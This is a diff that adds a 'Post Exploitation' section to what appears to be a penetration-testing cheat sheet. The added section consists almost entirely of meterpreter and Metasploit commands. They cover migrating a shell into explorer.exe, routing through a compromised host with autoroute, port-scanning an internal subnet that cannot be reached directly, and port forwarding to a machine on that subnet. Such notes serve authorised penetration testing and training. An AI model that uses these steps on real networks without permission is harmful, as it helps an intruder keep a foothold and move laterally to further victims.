@@ -150,6 +150,68 @@ run
 ```
 -----------
 
+# Post Exploitation
+<hr>
+
+## Stabilizing your meterpreter shell
+
+#### To list running processes you can migrate to
+```
+meterpreter> ps
+```
+#### To look for a particular process
+```
+meterpreter> pgrep explorer.exe
+```
+#### To migrate
+```
+meterpreter> migrate -N explorer.exe
+```
+
+## Pivoting with meterpreter
+
+Let's say we have compromised a machine using metasploit and we have a meterpreter shell with session id 1. We discover that there is another machine but it's reachable only from the compromised machine.
+Our IP: ```192.168.50.10```
+Compromised host: ```192.168.50.89```
+Unreachable machine: ```192.168.5.45```. 
+
+So the subnet of the unreachable machine would be ```192.168.5.0/24```
+
+#### To add the route 
+```
+metepreter> run autoroute -s 192.168.5.0/24
+```
+#### To list active routes
+```
+meterpreter> run autoroute -p
+```
+#### To scan for available hosts in the subnet of the unreachable machine
+
+##### first, background the session
+```
+ctrl + z
+```
+##### now, run the tcp module
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.5.0/24
+set PORTS 80, 8080, 445, 22, 10000, 3306
+run
+```
+#### To portfwd
+```
+metrepreter> portfwd add -l 1234 -p 80 -r 192.168.5.45
+
+-l --> port you want to forward to
+-p --> port you want to forward
+-r --> ip address found when you scanned for available hosts available in the subnet of the unreachable machine
+```
+#### To access the url of the forwarded port
+```
+http://127.0.0.1:1234
+```
+
+
 
 
 
